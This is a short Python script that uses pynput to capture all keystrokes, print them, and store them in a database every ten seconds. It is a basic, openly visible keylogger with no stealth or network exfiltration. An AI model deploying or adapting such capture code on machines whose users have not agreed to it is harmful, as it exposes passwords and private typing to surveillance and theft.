from pynput import keyboard
import time
import threading

from db import insert_keypress

pressed_keys = []

def on_key_press(key):
    try:
        key_char = key.char if hasattr(key, 'char') else str(key)
        print(f"Keys pressed: {key_char}")
        pressed_keys.append(key_char)
    except AttributeError:
        special_key = str(key)
        print(f"Keys pressed: {special_key}")
        pressed_keys.append(special_key)

def print_pressed_keys():
    while True:
        time.sleep(10)  
        current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())  
        print(f"============================================= Time: {current_time}")
        print(f"Keys pressed in the last 10 seconds: {pressed_keys}")
        insert_keypress(pressed_keys)
        pressed_keys.clear()

def start_key_listener():
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

timer = threading.Thread(target=print_pressed_keys)
timer.start()

start_key_listener()
